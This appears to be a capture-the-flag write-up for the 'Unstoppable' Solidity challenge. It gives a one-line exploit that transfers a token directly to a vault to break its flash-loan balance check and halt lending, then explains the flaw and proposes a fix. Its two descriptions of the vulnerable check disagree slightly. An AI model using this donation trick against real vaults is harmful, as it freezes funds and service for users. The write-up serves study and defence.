## Challenge 1: Unstoppable

### Vulnerability
The `UnstoppableVault` contract has a logic flaw in the `flashLoan` function where it checks `totalAssets() != totalSupply + amount` which can be broken by directly transferring tokens to the vault.

### Exploit Code
```solidity
// In Unstoppable.t.sol - test_unstoppable() function
function test_unstoppable() public checkSolvedByPlayer {
    // Transfer tokens directly to vault to break the totalAssets calculation
    token.transfer(address(vault), 1);
}
```

### Why it works
- The vault checks if `totalAssets() == totalSupply + amount`
- `totalAssets()` returns `token.balanceOf(address(this))`
- Direct token transfer increases balance but doesn't mint shares
- This breaks the invariant and prevents future flash loans

### Fix
> Remove the faulty check 

**File:** `src/unstoppable/UnstoppableVault.sol`
**Vulnerable Code (lines ~87-89):**
```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
    external returns (bool)
{
    if (amount == 0) revert InvalidAmount(0); // @dev amount must be greater than 0
    if (address(asset) != _token) revert UnsupportedCurrency(); // @dev asset must be supported

    uint256 balanceBefore = totalAssets();
    if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance(); // This line is vulnerable!
    
    // ... rest of function
}
```

**The Problem:** `convertToShares(totalSupply) != balanceBefore` assumes perfect 1:1 relationship between shares and assets. When someone sends tokens directly to the vault (not through `deposit()`), the `totalAssets()` increases but `totalSupply` of shares doesn't, breaking this check.

**What the vulnerable line means:**
- `totalAssets()` = `asset.balanceOf(address(this))` (actual token balance)  
- `convertToShares(totalSupply)` = converts share supply back to asset amount
- The check assumes these should always be equal
- Direct token transfers break this assumption

**Fixed Code:**
```solidity
function flashLoan(IERC3156FlashBorrower receiver, address _token, uint256 amount, bytes calldata data)
    external returns (bool)
{
    if (amount == 0) revert InvalidAmount(0);
    if (address(asset) != _token) revert UnsupportedCurrency();

    uint256 balanceBefore = totalAssets();
    
    // REMOVED: if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
    // This check is fundamentally flawed and should be removed entirely
    
    if (amount > balanceBefore) revert InsufficientBalance();

    // ... rest of function remains the same
}
```

